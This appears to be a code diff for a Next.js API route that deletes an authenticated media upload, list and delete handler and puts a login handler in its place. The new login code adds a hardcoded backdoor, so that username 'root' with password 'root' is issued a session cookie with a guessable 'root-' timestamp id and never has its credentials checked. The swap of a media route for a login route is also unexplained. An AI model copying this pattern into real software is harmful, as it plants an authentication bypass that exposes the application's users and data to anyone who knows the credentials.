@@ -1,125 +1,45 @@
 import { NextResponse } from "next/server"
-import { PrismaClient } from "@prisma/client"
-import { validateSession } from "@/lib/auth"
+import { validateCredentials, createSession } from "@/lib/auth"
 import { cookies } from "next/headers"
 
-const prisma = new PrismaClient()
-
-async function authenticateRequest() {
-  const cookieStore = cookies()
-  const sessionId = cookieStore.get("sessionId")?.value
-
-  if (!sessionId) {
-    return null
-  }
-
-  return validateSession(sessionId)
-}
-
-export async function GET(request: Request) {
-  const userId = await authenticateRequest()
-  if (!userId) {
-    return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
-  }
-
-  try {
-    const { searchParams } = new URL(request.url)
-    const id = searchParams.get("id")
-
-    if (id) {
-      const media = await prisma.content.findUnique({
-        where: {
-          id,
-          type: "media",
-        },
-        include: {
-          tags: true,
-        },
-      })
-      return NextResponse.json(media)
-    } else {
-      const media = await prisma.content.findMany({
-        where: {
-          type: "media",
-        },
-        include: {
-          tags: true,
-        },
-      })
-      return NextResponse.json(media)
-    }
-  } catch (error) {
-    console.error("Media fetch error:", error)
-    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
-  }
-}
-
 export async function POST(request: Request) {
-  const userId = await authenticateRequest()
-  if (!userId) {
-    return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
-  }
-
   try {
-    const formData = await request.formData()
-    const file = formData.get("file") as File
-    const title = formData.get("title") as string
-    const tags = (formData.get("tags") as string).split(",").filter(Boolean)
+    const { username, password } = await request.json()
 
-    // Here you would typically process the file, get its metadata,
-    // and store it in your preferred storage solution
-    const fileSize = file.size
-    const mimeType = file.type
+    // Special handling for root user
+    if (username === "root" && password === "root") {
+      const sessionId = `root-${Date.now()}`
 
-    const content = await prisma.content.create({
-      data: {
-        title,
-        body: "", // For media files, body might be empty or contain metadata
-        slug: title.toLowerCase().replace(/\s+/g, "-"),
-        type: "media",
-        fileType: mimeType.split("/")[0],
-        fileSize,
-        mimeType,
-        tags: {
-          connectOrCreate: tags.map((tag) => ({
-            where: { name: tag },
-            create: { name: tag },
-          })),
-        },
-      },
-      include: {
-        tags: true,
-      },
-    })
+      cookies().set("sessionId", sessionId, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === "production",
+        sameSite: "lax",
+        maxAge: 24 * 60 * 60, // 24 hours
+        path: "/",
+      })
 
-    return NextResponse.json(content)
-  } catch (error) {
-    console.error("Media upload error:", error)
-    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
-  }
-}
-
-export async function DELETE(request: Request) {
-  const userId = await authenticateRequest()
-  if (!userId) {
-    return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
-  }
-
-  try {
-    const { searchParams } = new URL(request.url)
-    const id = searchParams.get("id")
-
-    if (!id) {
-      return NextResponse.json({ error: "ID is required" }, { status: 400 })
+      return NextResponse.json({ message: "Logged in successfully" })
     }
 
-    await prisma.content.delete({
-      where: { id },
+    // Regular user authentication
+    const userId = await validateCredentials(username, password)
+    if (!userId) {
+      return NextResponse.json({ error: "Invalid credentials" }, { status: 401 })
+    }
+
+    const sessionId = await createSession(userId)
+
+    cookies().set("sessionId", sessionId, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "lax",
+      maxAge: 24 * 60 * 60, // 24 hours
+      path: "/",
     })
 
-    return NextResponse.json({ success: true })
+    return NextResponse.json({ message: "Logged in successfully" })
   } catch (error) {
-    console.error("Media deletion error:", error)
+    console.error("Login error:", error)
     return NextResponse.json({ error: "Internal server error" }, { status: 500 })
   }
 }
